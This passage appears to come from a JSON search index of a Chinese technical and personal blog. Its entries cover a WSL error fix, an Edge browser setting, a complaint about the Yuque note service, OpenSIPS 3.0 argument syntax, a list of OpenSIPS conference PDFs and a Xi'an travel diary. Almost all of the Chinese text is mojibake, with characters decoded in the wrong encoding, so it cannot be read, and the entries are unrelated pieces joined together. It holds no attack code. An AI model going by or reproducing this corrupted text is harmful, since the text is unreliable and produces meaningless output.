è¿™ä¸ªå·¥å…·ä»…ä»…æ˜¯ä¸ªç©å…·ã€‚éšç€windowsæ›´æ–°ï¼Œè¿™ä¸ªå·¥å…·éšæ—¶éƒ½ä¼šå´©æºƒï¼Œæœ€å¥½ä¸è¦å¤ªä¾èµ–å®ƒã€‚\n","permalink":"https://wdd.js.org/posts/2022/12/wsl-error-0x80040154-after-windows-update/","summary":"æœ€è¿‘æˆ‘æ›´æ–°äº†Windows, ä¹‹åæˆ‘çš„Windows Linuxå­ç³»ç»ŸUbuntuæ‰“å¼€å°±æŠ¥é”™äº†\næŠ¥é”™æˆªå›¾å¦‚ä¸‹ï¼š\nåœ¨ç½‘ä¸Šæœäº†ä¸€è¾¹ä¹‹åï¼Œå¾ˆå¤šæ•™ç¨‹éƒ½æ˜¯è¯´è¦æ‰“å¼€Windowsçš„å­ç³»ç»Ÿçš„åŠŸèƒ½ã€‚ ä½†æ˜¯ç”±äºæˆ‘å·²ç»ä½¿ç”¨Linuxå­ç³»ç»Ÿå·²ç»å¾ˆé•¿æ—¶é—´äº†ï¼Œæˆ‘è§‰å¾—åº”è¯¥å’Œè¿™ä¸ªè®¾ç½®æ— å…³ã€‚\nè€Œä¸”æˆ‘æ£€æŸ¥äº†ä¸€ä¸‹ï¼Œæˆ‘çš„è¿™ä¸ªè®¾ç½®æœ¬æ¥å°±æ˜¯æ‰“å¼€çš„ã€‚\nç„¶åæˆ‘åœ¨Powershellé‡Œè¾“å…¥ wslï¼Œ è¿™ä¸ªå‘½ä»¤éƒ½ç›´æ¥æŠ¥é”™äº†ã€‚\nPS C:\\WINDOWS\\system32\u0026gt; wsl --install æ²¡æœ‰æ³¨å†Œç±» Error code: Wsl/0x80040154 ç„¶åæˆ‘åˆ°wslçš„githubä¸Šæœç´¢ç±»ä¼¼çš„é—®é¢˜ï¼ŒæŸ¥åˆ°æœ‰å¾ˆå¤šç±»ä¼¼çš„æè¿°ï¼Œéƒ½æ˜¯å‡çº§ä¹‹åé‡åˆ°çš„é—®é¢˜ï¼Œæˆ‘è¯•äº†å¥½å‡ ä¸ªæ–¹å¼ï¼Œéƒ½æ²¡ç”¨ã€‚\nä½†æ˜¯æœ€åè¿™ä¸ªæœ‰ç”¨äº†ï¼\nhttps://github.com/microsoft/WSL/issues/9064\nè§£å†³çš„æ–¹æ¡ˆå°±æ˜¯ï¼š\nå¸è½½å·²ç»å®‰è£…è¿‡çš„Windows SubSystem For Linux Preview ç„¶åå†Windowsåº”ç”¨å•†åº—é‡æ–°å®‰è£…è¿™ä¸ªåº”ç”¨ Windowsçš„å‡çº§ä¹‹åï¼Œå¯èƒ½Windows Linuxå­ç³»ç»Ÿç»„å»ºä¹Ÿæ›´æ–°äº†æŸäº›äº†å†…å®¹ã€‚\næ‰€ä»¥éœ€è¦é‡è£…ã€‚\nè¿™é‡Œä¸å¾—ä¸åæ§½ä¸€ä¸‹WSL, è¿™ä¸ªå·¥å…·ä»…ä»…æ˜¯ä¸ªç©å…·ã€‚éšç€windowsæ›´æ–°ï¼Œè¿™ä¸ªå·¥å…·éšæ—¶éƒ½ä¼šå´©æºƒï¼Œæœ€å¥½ä¸è¦å¤ªä¾èµ–å®ƒã€‚","title":"Windowsæ›´æ–°ä¹‹å LinuxæŠ¥é”™ Error 0x80040154"},{"content":"åœ¨è®¾ç½®é‡Œæœç´¢åŒå‡»ï¼Œå¦‚æœæœ‰ä½¿ç”¨åŒå‡»å…³é—­æµè§ˆå™¨é€‰é¡¹å¡ï¼Œ åˆ™å¼€å¯ã€‚\nå¯¹äºç”¨é¼ æ ‡å…³é—­æ ‡ç­¾é¡µæ¥è¯´ï¼Œçš„ç¡®å¯ä»¥æé«˜æå¤§çš„æ•ˆç‡ã€‚\n","permalink":"https://wdd.js.org/posts/2022/12/double-click-close-tab/","summary":"åœ¨è®¾ç½®é‡Œæœç´¢åŒå‡»ï¼Œå¦‚æœæœ‰ä½¿ç”¨åŒå‡»å…³é—­æµè§ˆå™¨é€‰é¡¹å¡ï¼Œ åˆ™å¼€å¯ã€‚\nå¯¹äºç”¨é¼ æ ‡å…³é—­æ ‡ç­¾é¡µæ¥è¯´ï¼Œçš„ç¡®å¯ä»¥æé«˜æå¤§çš„æ•ˆç‡ã€‚","title":"Edgeæµè§ˆå™¨åŒå‡»æ ‡ç­¾æ  å…³é—­æ ‡ç­¾é¡µ"},{"content":"æˆ‘åœ¨2019å¹´çš„å…­æœˆä»½æ—¶å€™ï¼Œå¼€å§‹ä½¿ç”¨è¯­é›€ã€‚\nä¸€è·¯èµ°æ¥ï¼Œæˆ‘è§è¯äº†è¯­é›€çš„åŠŸèƒ½è¶Šæ¥è¶Šå¤šï¼Œä½†æ˜¯äºæ­¤åŒæ—¶ï¼Œæˆ‘ä¹Ÿè¶Šæ¥è¶Šè®¨åŒè¯­é›€ã€‚\n2022å¹´12æœˆåˆï¼Œæˆ‘åŸºæœ¬ä¸ŠæŠŠè¯­é›€ä¸Šçš„æ‰€æœ‰å†…å®¹éƒ½è¿ç§»åˆ°æˆ‘çš„hugoåšå®¢ä¸Šã€‚\næˆ‘çš„åšå®¢å¾ˆä¹±ï¼Œä¹Ÿå¾ˆå¤šã€‚æˆ‘å†™äº†ä¸€ä¸ªè„šæœ¬ï¼Œä¸€ä¸ªä¸€ä¸ªçŸ¥è¯†åº“çš„æ¬è¿ï¼Œæ€»ä½“é€Ÿåº¦è¿˜ç®—å¿«ï¼Œå”¯ä¸€ä¸ä¾¿çš„å°±æ˜¯å›¾ç‰‡éœ€è¦ä¸€ä¸ªä¸€ä¸ªå¤åˆ¶ç²˜è´´ã€‚\næœ‰äº›å›¾ç‰‡æ˜¯ç”¨è¯­é›€çš„ç»˜å›¾è¯­è¨€ä¾‹å¦‚plantumlç¼–å†™çš„ï¼Œå°±åªèƒ½æˆªå›¾ä¿å­˜äº†ã€‚\næ€»ä¹‹ï¼Œæˆ‘ä¹Ÿæ˜¯è›®ç´¯çš„ã€‚\nç®€å•åˆ—ä¸€ä¸‹æˆ‘ä¸å–œæ¬¢è¯­é›€çš„å‡ ä¸ªåŸå› :\næ€§èƒ½å·®ï¼Œé¦–é¡µæ¸²æŸ“æ…¢ï¼Œå¸¸å¸¸è¦ç­‰å¾ˆä¹…ï¼Œé¦–é¡µæ‰èƒ½æ‰“å¼€ äº§å“å®šä½æ··ä¹±ï¼Œéšæ„æ›´æ”¹ç”¨æˆ·æ•°æ® æˆ‘è®°å¾—æœ‰æ—¶å€™æˆ‘æŠŠçŸ¥è¯†åº“å‡çº§æˆäº†ç©ºé—´ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆç©ºé—´ç”±å˜æˆäº†çŸ¥è¯†åº“ã€‚ æ•°å­—èŠ±å›­è¿™ä¸ªæ¦‚å¿µçœŸçš„å¾ˆçƒ‚ã€‚æˆ‘å¥½å¥½çš„ä¸ªäººä¸»é¡µï¼ŒæŸä¸€å¤©æ‰“å¼€ï¼Œå¤§å˜æ ·ï¼Œæ¢äº†ä¸ªåå­—ï¼Œå«åšæ•°å­—èŠ±å›­ã€‚ç”šè‡³æ²¡æœ‰ç»™ç”¨æˆ·ä¸€ä¸ªé€‰æ‹©ä¿ç•™è€ç‰ˆæœ¬çš„ä¸ªäººä¸»é¡µçš„æƒåˆ©ã€‚å¤ªä¸å°Šé‡ç”¨æˆ·äº†ï¼ï¼ å°±å¥½åƒä½ ä¸‹ç­å›å®¶ï¼Œçœ‹è§æˆ¿é—¨è¢«äººæ’¬å¼€ï¼Œä½ æ‰“å¼€æˆ¿é—¨ï¼Œçœ‹è§æœ‰äººåœ¨ä½ çš„å®¢å…ç§æ»¡å¤§è’œï¼Œç„¶åè¿˜å…´é«˜é‡‡çƒˆçš„å‘Šè¯‰ä½ ï¼Œçœ‹ï¼Œè¿™æ˜¯æ‚¨çš„æ•°å­—èœå›­ï¼å¤šå¥½ï¼Œä»¥åä¸ç”¨ä¹°è’œäº†ã€‚ ä¼šå‘˜çš„æµé‡è®¡è´¹è§„åˆ™ï¼Œ æˆ–è®¸ç°åœ¨çš„è®¡è´¹è§„åˆ™å·²ç»å˜äº†ï¼Œæˆ‘ä¹Ÿæ²¡æœ‰å†å……ä¼šå‘˜ï¼Œä½†æ˜¯å†ä»¥å‰ã€‚å³ä½¿æ˜¯ä¼šå‘˜ï¼Œä¹Ÿæ˜¯æŒ‰æµé‡è®¡è´¹çš„ã€‚ä»€ä¹ˆå«æŒ‰æµé‡è®¡è´¹ï¼Œå‡å¦‚ä½ çš„ä¸€ç¯‡åšå®¢é‡Œä¸Šä¼ äº†ä¸€å¼ 1mbçš„å›¾ç‰‡ï¼Œå³ä½¿ä½ åæ¥æŠŠè¿™ä¸ªå›¾ç‰‡åˆ äº†ï¼Œè¿™1mbçš„æµé‡è¿˜æ˜¯ä¼šå­˜åœ¨ã€‚è€Œä¸”æµé‡æ˜¯ä¸€ç›´å¾€ä¸Šæ¶¨çš„ï¼Œè¿˜ä¸åƒè¿è¥å•†ï¼Œæ¯æœˆä¸€å·ç»™ä½ æ¸…é›¶ä¸€æ¬¡çš„æœºä¼šã€‚ ","permalink":"https://wdd.js.org/posts/2022/12/why-i-dont-not-use-yuque-any-more/","summary":"æˆ‘åœ¨2019å¹´çš„å…­æœˆä»½æ—¶å€™ï¼Œå¼€å§‹ä½¿ç”¨è¯­é›€ã€‚\nä¸€è·¯èµ°æ¥ï¼Œæˆ‘è§è¯äº†è¯­é›€çš„åŠŸèƒ½è¶Šæ¥è¶Šå¤šï¼Œä½†æ˜¯äºæ­¤åŒæ—¶ï¼Œæˆ‘ä¹Ÿè¶Šæ¥è¶Šè®¨åŒè¯­é›€ã€‚\n2022å¹´12æœˆåˆï¼Œæˆ‘åŸºæœ¬ä¸ŠæŠŠè¯­é›€ä¸Šçš„æ‰€æœ‰å†…å®¹éƒ½è¿ç§»åˆ°æˆ‘çš„hugoåšå®¢ä¸Šã€‚\næˆ‘çš„åšå®¢å¾ˆä¹±ï¼Œä¹Ÿå¾ˆå¤šã€‚æˆ‘å†™äº†ä¸€ä¸ªè„šæœ¬ï¼Œä¸€ä¸ªä¸€ä¸ªçŸ¥è¯†åº“çš„æ¬è¿ï¼Œæ€»ä½“é€Ÿåº¦è¿˜ç®—å¿«ï¼Œå”¯ä¸€ä¸ä¾¿çš„å°±æ˜¯å›¾ç‰‡éœ€è¦ä¸€ä¸ªä¸€ä¸ªå¤åˆ¶ç²˜è´´ã€‚\næœ‰äº›å›¾ç‰‡æ˜¯ç”¨è¯­é›€çš„ç»˜å›¾è¯­è¨€ä¾‹å¦‚plantumlç¼–å†™çš„ï¼Œå°±åªèƒ½æˆªå›¾ä¿å­˜äº†ã€‚\næ€»ä¹‹ï¼Œæˆ‘ä¹Ÿæ˜¯è›®ç´¯çš„ã€‚\nç®€å•åˆ—ä¸€ä¸‹æˆ‘ä¸å–œæ¬¢è¯­é›€çš„å‡ ä¸ªåŸå› :\næ€§èƒ½å·®ï¼Œé¦–é¡µæ¸²æŸ“æ…¢ï¼Œå¸¸å¸¸è¦ç­‰å¾ˆä¹…ï¼Œé¦–é¡µæ‰èƒ½æ‰“å¼€ äº§å“å®šä½æ··ä¹±ï¼Œéšæ„æ›´æ”¹ç”¨æˆ·æ•°æ® æˆ‘è®°å¾—æœ‰æ—¶å€™æˆ‘æŠŠçŸ¥è¯†åº“å‡çº§æˆäº†ç©ºé—´ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆç©ºé—´ç”±å˜æˆäº†çŸ¥è¯†åº“ã€‚ æ•°å­—èŠ±å›­è¿™ä¸ªæ¦‚å¿µçœŸçš„å¾ˆçƒ‚ã€‚æˆ‘å¥½å¥½çš„ä¸ªäººä¸»é¡µï¼ŒæŸä¸€å¤©æ‰“å¼€ï¼Œå¤§å˜æ ·ï¼Œæ¢äº†ä¸ªåå­—ï¼Œå«åšæ•°å­—èŠ±å›­ã€‚ç”šè‡³æ²¡æœ‰ç»™ç”¨æˆ·ä¸€ä¸ªé€‰æ‹©ä¿ç•™è€ç‰ˆæœ¬çš„ä¸ªäººä¸»é¡µçš„æƒåˆ©ã€‚å¤ªä¸å°Šé‡ç”¨æˆ·äº†ï¼ï¼ å°±å¥½åƒä½ ä¸‹ç­å›å®¶ï¼Œçœ‹è§æˆ¿é—¨è¢«äººæ’¬å¼€ï¼Œä½ æ‰“å¼€æˆ¿é—¨ï¼Œçœ‹è§æœ‰äººåœ¨ä½ çš„å®¢å…ç§æ»¡å¤§è’œï¼Œç„¶åè¿˜å…´é«˜é‡‡çƒˆçš„å‘Šè¯‰ä½ ï¼Œçœ‹ï¼Œè¿™æ˜¯æ‚¨çš„æ•°å­—èœå›­ï¼å¤šå¥½ï¼Œä»¥åä¸ç”¨ä¹°è’œäº†ã€‚ ä¼šå‘˜çš„æµé‡è®¡è´¹è§„åˆ™ï¼Œ æˆ–è®¸ç°åœ¨çš„è®¡è´¹è§„åˆ™å·²ç»å˜äº†ï¼Œæˆ‘ä¹Ÿæ²¡æœ‰å†å……ä¼šå‘˜ï¼Œä½†æ˜¯å†ä»¥å‰ã€‚å³ä½¿æ˜¯ä¼šå‘˜ï¼Œä¹Ÿæ˜¯æŒ‰æµé‡è®¡è´¹çš„ã€‚ä»€ä¹ˆå«æŒ‰æµé‡è®¡è´¹ï¼Œå‡å¦‚ä½ çš„ä¸€ç¯‡åšå®¢é‡Œä¸Šä¼ äº†ä¸€å¼ 1mbçš„å›¾ç‰‡ï¼Œå³ä½¿ä½ åæ¥æŠŠè¿™ä¸ªå›¾ç‰‡åˆ äº†ï¼Œè¿™1mbçš„æµé‡è¿˜æ˜¯ä¼šå­˜åœ¨ã€‚è€Œä¸”æµé‡æ˜¯ä¸€ç›´å¾€ä¸Šæ¶¨çš„ï¼Œè¿˜ä¸åƒè¿è¥å•†ï¼Œæ¯æœˆä¸€å·ç»™ä½ æ¸…é›¶ä¸€æ¬¡çš„æœºä¼šã€‚ ","title":"ä¸ºä»€ä¹ˆæˆ‘ä¸å†ä½¿ç”¨è¯­é›€"},{"content":"å†™è¿‡opensipsè„šæœ¬çš„åŒå­¦ï¼Œå¾€å¾€å¯¹å‡½æ•°çš„ä¼ å‚æ„Ÿåˆ°å›°æƒ‘ã€‚\nä¾‹å¦‚ï¼š\nds_select_dst()å¯ä»¥æ¥å—æ•´æ•°æˆ–è€…å€¼ä¸ºæ­£æ•°çš„å˜é‡ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯nat_uac_test()çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±åªèƒ½æ˜¯æ•´æ•°ï¼Œè€Œä¸èƒ½æ˜¯å˜é‡ ä¸ºä»€ä¹ˆrl_check()å¯ä»¥æ¥å—æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²ï¼Œè€Œsave()åªèƒ½æ¥å—å­—ç¬¦ä¸²ã€‚ ä¸ºä»€ä¹ˆds_select_dst(\u0026quot;1\u0026quot;, \u0026quot;4\u0026quot;) ä½œä¸ºæ•´æ•°ä¹Ÿè¦åŠ ä¸ŠåŒå¼•å·ï¼Ÿ ä¸ºä»€ä¹ˆå˜é‡è¦åŠ ä¸ŠåŒå¼•å·ï¼Ÿ ds_select_dst(\u0026quot;$var(aa)\u0026quot;, \u0026quot;4\u0026quot;) ä¸ºä»€ä¹ˆt_on_branch(\u0026quot;1\u0026quot;)è·¯ç”±çš„é’©å­è¦åŠ ä¸ŠåŒå¼•å·ï¼Ÿ ä¸ºä»€ä¹ˆroute(go_to_something);è¿™é‡Œåˆä¸éœ€è¦åŠ ä¸Šå¼•å·ï¼Ÿ ds_select_dst(\u0026#34;1\u0026#34;, \u0026#34;0\u0026#34;); $var(aa)=1; ds_select_dst(\u0026#34;$var(aa)\u0026#34;, \u0026#34;0\u0026#34;); rl_check(\u0026#34;gw_$ru\u0026#34;, \u0026#34;$var(limit)\u0026#34;); #æ ¼å¼åŒ–çš„gw_$ru save(\u0026#34;location\u0026#34;); #å•çº¯çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•° ä»3.0å¼€å§‹ï¼Œä¼ å‚å¯ä»¥æ›´åŠ è‡ªç„¶ã€‚\næ•´æ•°å¯ä»¥ç›´æ¥ä¼ å‚ï¼Œä¸ç”¨åŠ åŒå¼•å· do_something(1, 1); è¾“å…¥æˆ–è€…è¾“å‡ºçš„$var(), ä¸ç”¨åŠ åŒå¼•å·ï¼ŒåŠ äº†åè€Œä¼šæŠ¥é”™ do_something($var(a), $var(b)); æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œéœ€è¦åŠ åŒå¼•å· do_something(1, \u0026#34;$var(bb)_$var(b)\u0026#34;); å‚è€ƒ https://blog.opensips.org/2019/11/05/the-module-function-interface-rework-in-opensips-3-0/ https://www.opensips.org/Documentation/Script-Syntax-3-0# ","permalink":"https://wdd.js.org/opensips/3x/module-args/","summary":"å†™è¿‡opensipsè„šæœ¬çš„åŒå­¦ï¼Œå¾€å¾€å¯¹å‡½æ•°çš„ä¼ å‚æ„Ÿåˆ°å›°æƒ‘ã€‚\nä¾‹å¦‚ï¼š\nds_select_dst()å¯ä»¥æ¥å—æ•´æ•°æˆ–è€…å€¼ä¸ºæ­£æ•°çš„å˜é‡ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯nat_uac_test()çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±åªèƒ½æ˜¯æ•´æ•°ï¼Œè€Œä¸èƒ½æ˜¯å˜é‡ ä¸ºä»€ä¹ˆrl_check()å¯ä»¥æ¥å—æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²ï¼Œè€Œsave()åªèƒ½æ¥å—å­—ç¬¦ä¸²ã€‚ ä¸ºä»€ä¹ˆds_select_dst(\u0026quot;1\u0026quot;, \u0026quot;4\u0026quot;) ä½œä¸ºæ•´æ•°ä¹Ÿè¦åŠ ä¸ŠåŒå¼•å·ï¼Ÿ ä¸ºä»€ä¹ˆå˜é‡è¦åŠ ä¸ŠåŒå¼•å·ï¼Ÿ ds_select_dst(\u0026quot;$var(aa)\u0026quot;, \u0026quot;4\u0026quot;) ä¸ºä»€ä¹ˆt_on_branch(\u0026quot;1\u0026quot;)è·¯ç”±çš„é’©å­è¦åŠ ä¸ŠåŒå¼•å·ï¼Ÿ ä¸ºä»€ä¹ˆroute(go_to_something);è¿™é‡Œåˆä¸éœ€è¦åŠ ä¸Šå¼•å·ï¼Ÿ ds_select_dst(\u0026#34;1\u0026#34;, \u0026#34;0\u0026#34;); $var(aa)=1; ds_select_dst(\u0026#34;$var(aa)\u0026#34;, \u0026#34;0\u0026#34;); rl_check(\u0026#34;gw_$ru\u0026#34;, \u0026#34;$var(limit)\u0026#34;); #æ ¼å¼åŒ–çš„gw_$ru save(\u0026#34;location\u0026#34;); #å•çº¯çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•° ä»3.0å¼€å§‹ï¼Œä¼ å‚å¯ä»¥æ›´åŠ è‡ªç„¶ã€‚\næ•´æ•°å¯ä»¥ç›´æ¥ä¼ å‚ï¼Œä¸ç”¨åŠ åŒå¼•å· do_something(1, 1); è¾“å…¥æˆ–è€…è¾“å‡ºçš„$var(), ä¸ç”¨åŠ åŒå¼•å·ï¼ŒåŠ äº†åè€Œä¼šæŠ¥é”™ do_something($var(a), $var(b)); æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œéœ€è¦åŠ åŒå¼•å· do_something(1, \u0026#34;$var(bb)_$var(b)\u0026#34;); å‚è€ƒ https://blog.opensips.org/2019/11/05/the-module-function-interface-rework-in-opensips-3-0/ https://www.opensips.org/Documentation/Script-Syntax-3-0# ","title":"æ¨¡å—ä¼ å‚çš„é‡æ„"},{"content":" TelNYX.pdf OpenSIPS 2.3 mediasoup Cutting Edge WebRTC Video COnferencing FreeSWITCH-driven routing in OpenSIPS Voicenter: Contact center on Steroids Vlad_Paiu-Distributed_OpenSIPS_Systems_Cluecon14.pdf Vlad_Paiu-OpenSIPS_Summit_Austin_2015-Async.pdf Ionut_Ionita-OpenSIPS_Summit2017-Capturing_beyond_SIP FLAVIO_GONCALVES-Fraud_in_VoIP_Today.pdf Alexandr_Dubovikov-OpenSIPS_Summit2017-RTC_Threat_Intelligence_Exchange.pdf OpenSIPS_LoadBalancing.pdf Vlad_Paiu-OpenSIPS_Summit_2104-OpenSIPS_End_User_Services.pdf Razvan_Crainea-OpenSIPS_Summit2017-From_SIPI_Trunks_to_End_Users.pdf Razvan_Crainea-OpenSIPS_Summit-Scaling_Asterisk.pdf Vlad_Paiu-OpenSIPS_Summit-Service_Enabling_for_Asterisk.pdf Jonas_Borjesson-OpenSIPS_Summit_Austin_2015.pdf Michele_Pinasi-OpenSIPS_Summit2017-How_we_did_VoIP.pdf Bogdan_Iancu-OpenSIPS_Summit_Keynotes.pdf Giovanni_Maruzselli-OpenSIPS_Summit2017-Scaling_FreeSWITCHes.pdf Maksym_Sobolyev-OpenSIPS_Summit2017-Sippy_Labs_update.pdf docker-cluster.pdf voip malware attack tool .pdf Bogdan_Iancu-OpenSIPS_Summit-OpenSIPS_2_1.pdf Pete_Kelly-OpenSIPS_Workshop_Chicago_2015-Calling_Cards_B2BUA.pdf Bogdan_Iancu-OpenSIPS_Summit-keynotes.pdf Alex_Goulis-Opensips_CNAME.pdf OpenSIPS_2.0_Framework.pdf Norman_Brandinger-OpenSIPS_Summit_2014-Advanced_SIP_Routing_with_OpenSIPS_modules.pdf ","permalink":"https://wdd.js.org/opensips/pdf/","summary":" TelNYX.pdf OpenSIPS 2.3 mediasoup Cutting Edge WebRTC Video COnferencing FreeSWITCH-driven routing in OpenSIPS Voicenter: Contact center on Steroids Vlad_Paiu-Distributed_OpenSIPS_Systems_Cluecon14.pdf Vlad_Paiu-OpenSIPS_Summit_Austin_2015-Async.pdf Ionut_Ionita-OpenSIPS_Summit2017-Capturing_beyond_SIP FLAVIO_GONCALVES-Fraud_in_VoIP_Today.pdf Alexandr_Dubovikov-OpenSIPS_Summit2017-RTC_Threat_Intelligence_Exchange.pdf OpenSIPS_LoadBalancing.pdf Vlad_Paiu-OpenSIPS_Summit_2104-OpenSIPS_End_User_Services.pdf Razvan_Crainea-OpenSIPS_Summit2017-From_SIPI_Trunks_to_End_Users.pdf Razvan_Crainea-OpenSIPS_Summit-Scaling_Asterisk.pdf Vlad_Paiu-OpenSIPS_Summit-Service_Enabling_for_Asterisk.pdf Jonas_Borjesson-OpenSIPS_Summit_Austin_2015.pdf Michele_Pinasi-OpenSIPS_Summit2017-How_we_did_VoIP.pdf Bogdan_Iancu-OpenSIPS_Summit_Keynotes.pdf Giovanni_Maruzselli-OpenSIPS_Summit2017-Scaling_FreeSWITCHes.pdf Maksym_Sobolyev-OpenSIPS_Summit2017-Sippy_Labs_update.pdf docker-cluster.pdf voip malware attack tool .pdf Bogdan_Iancu-OpenSIPS_Summit-OpenSIPS_2_1.pdf Pete_Kelly-OpenSIPS_Workshop_Chicago_2015-Calling_Cards_B2BUA.pdf Bogdan_Iancu-OpenSIPS_Summit-keynotes.pdf Alex_Goulis-Opensips_CNAME.pdf OpenSIPS_2.0_Framework.pdf Norman_Brandinger-OpenSIPS_Summit_2014-Advanced_SIP_Routing_with_OpenSIPS_modules.pdf ","title":"Pdfå­¦ä¹ èµ„æ–™"},{"content":"ä¸€å¹´è¿‡åŠä»¥åï¼Œå¶ç„¶æ‰“å¼€å¾®ä¿¡å…¬ä¼—å·ï¼Œçœ‹åˆ°è‰ç¨¿ç®±é‡Œçš„ç¯‡æ–‡ç« ã€‚æˆ‘æ‰å›æƒ³èµ·å»å¹´å¸¦å¥³å‹å»è¥¿å®‰çš„é‚£ä¸ªé¥è¿œçš„å¤å¤©ã€‚\nå¦‚ä»Šå¥³å‹å·²ç»å˜æˆè€å©†ï¼Œè¿™ç¯‡æ–‡ç« æˆ‘æ‰æƒ³èµ·æ¥å‘è¡¨ã€‚\nday 1 é’Ÿæ¥¼ é¼“æ¥¼ å›æ°‘è¡— é‚£æ˜¯å…­æœˆæœ«çš„æ—¶å€™ï¼Œå’Œå¥³å‹ä¸€èµ·åç«è½¦å»äº†è¶Ÿè¥¿å®‰ã€‚\nä¸ºä»€ä¹ˆè¦å»è¥¿å®‰å‘¢ï¼Ÿæ®åƒè´§å¥³å‹è¯´ï¼Œè¥¿å®‰æœ‰éå¸¸å¤šçš„å¥½åƒçš„ã€‚æ‰€ä»¥äººç”Ÿæ˜¯å¿…é¡»è¦å»ä¸€è¶Ÿçš„ã€‚\næ¸…æ™¨ï¼Œæˆ‘ä»¬ä»å—äº¬å—ç«™å‡ºå‘ååŠ¨è½¦ï¼Œä¸€è·¯å‘è¥¿ï¼Œåäº†5ä¸ªå¤šå°æ—¶ï¼Œåˆ°è¾¾è¥¿å®‰åŒ—ç«™ã€‚\nè·¯ä¸Šæˆ‘å¸¦äº†ä¸€ä¸ª1500mlçš„æ°´ç“¶ï¼Œä»¥åŠ1500mlçš„é…¸å¥¶ã€‚\nå¥³å‹åæ§½è¯´ï¼Œè¿˜å¥½æ²¡åšé£æœºï¼Œä¸ç„¶æˆ‘å°±åƒå®å¼ºä¸€æ ·ï¼Œè¦åœ¨æœºåœºå¹²å®Œä¸€å¤§ç“¶é…¸å¥¶äº†ã€‚\nä¸‹äº†åŠ¨è½¦ï¼Œç«‹å³å‰å¾€é’Ÿæ¥¼è®¢çš„å®¾é¦†ï¼Œæ”¾ç½®è¡Œæã€‚\nè¥¿å®‰é’Ÿæ¥¼ä½äºè¥¿å®‰å¸‚ä¸­å¿ƒï¼Œæ˜¯ä¸­å›½ç°å­˜é’Ÿæ¥¼ä¸­å½¢åˆ¶æœ€å¤§ã€ä¿å­˜æœ€å®Œæ•´çš„ä¸€åº§ã€‚å»ºäºæ˜å¤ªç¥–æ´ªæ­¦åä¸ƒå¹´ï¼Œåˆå»ºäºä»Šå¹¿æµè¡—å£ï¼Œä¸é¼“æ¥¼ç›¸å¯¹ï¼Œæ˜ç¥å®—ä¸‡å†åå¹´æ•´ä½“è¿ç§»äºä»Šå€ã€‚\næ²¿ç€é’Ÿæ¥¼é™„è¿‘ï¼Œæˆ‘ä»¬é€›äº†ä¸€åœˆå›æ°‘è¡—ã€‚\nå›æ°‘è¡—æ˜¯è¥¿å®‰è‘—åçš„ç¾é£Ÿæ–‡åŒ–è¡—åŒºï¼Œæ˜¯è¥¿å®‰å°åƒè¡—åŒºã€‚\nè¥¿å®‰å›æ°‘è¡—ä½œä¸ºè¥¿å®‰é£æƒ…çš„ä»£è¡¨ä¹‹ä¸€ï¼Œæ˜¯å›æ°‘è¡—åŒºå¤šæ¡è¡—é“çš„ç»Ÿç§°ï¼Œç”±åŒ—å¹¿æµè¡—ã€åŒ—é™¢é—¨ã€è¥¿ç¾Šå¸‚ã€å¤§çš®é™¢ã€åŒ–è§‰å··ã€æ´’é‡‘æ¡¥ç­‰æ•°æ¡è¡—é“ç»„æˆï¼Œåœ¨é’Ÿé¼“æ¥¼åã€‚\né’Ÿæ¥¼\nday 2 å¤§å”èŠ™è“‰åŸ å¤§å”ä¸å¤œåŸ å¤§é›å¡” å¤§å”èŠ™è“‰åŸæ˜¯ä¸€åº§ä»¿å”å»ºç­‘ï¼Œé‡Œé¢æœ‰è®¸å¤šæ™¯ç‚¹ï¼Œæˆ–è®¸æˆ‘ä»¬ä¸åº”è¯¥æ—©ä¸Šæ¥ï¼Œå› ä¸ºä¸Šåˆå¤ªçƒ­äº†ã€‚\nå”¯ä¸€åº†å¹¸çš„æ˜¯ï¼Œæˆ‘ä»¬å¸¦äº†ä¸€ä¸ªå¾ˆå¤§çš„æ°´æ¯ï¼Œè€Œä¸”èŠ™è“‰åŸé‡Œæä¾›å…è´¹çš„å¼€æ°´ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰æ²¡æœ‰è¢«æ¸´æ­»ã€‚\nå¤§å”èŠ™è“‰åŸ è¥¿æ¸¸å¸ˆå¾’å››äºº é›•å¡‘\nå‚æ™šçš„ å¤§å”ä¸å¤œåŸ\nå¤œå¹•é™ä¸´çš„ å¤§å”ä¸å¤œåŸ\né—æ†¾ä¹‹ä¸€ï¼šå¤§é›å¡”æ²¡æœ‰å»çœ‹ï¼Œå› ä¸ºå½“æ—¶æ­£åœ¨ç»´ä¿®ï¼Œå‘¨å›´å…¨æ˜¯è„šæ‰‹æ¶ã€‚ é—æ†¾ä¹‹äºŒï¼šæ²¡æœ‰åˆ°é™•è¥¿å†å²åšç‰©é¦†çœ‹çœ‹ï¼Œå› ä¸ºæ²¡æœ‰æ—©ç‚¹é¢„çº¦\nå¥³å‹åŸ‹æ€¨æˆ‘è¯´æˆ‘ä¸æ—©ç‚¹åšæ”»ç•¥ï¼Œå®³å¾—è¿™ä¹ˆå¤šæ™¯ç‚¹å»ä¸äº†ã€‚\næˆ‘è¯´æˆ‘æ˜¯åšäº†æ”»ç•¥çš„ï¼Œè¿˜è®°åœ¨å¤‡å¿˜å½•é‡Œé¢å‘¢ã€‚\nå¥³å‹æ‰“å¼€æˆ‘çš„å¤‡å¿˜å½•ä¸€çœ‹ï¼Œç¬‘å‡ºçœ¼æ³ªè¯´ï¼šä½ åšçš„å•¥ç‹—å±æ”»ç•¥ï¼Œå°±è¿™å‡ ä¸ªå­—ï¼ç”·äººæœç„¶é ä¸ä½ï¼\næˆ‘è¯´: è¿™ä½ 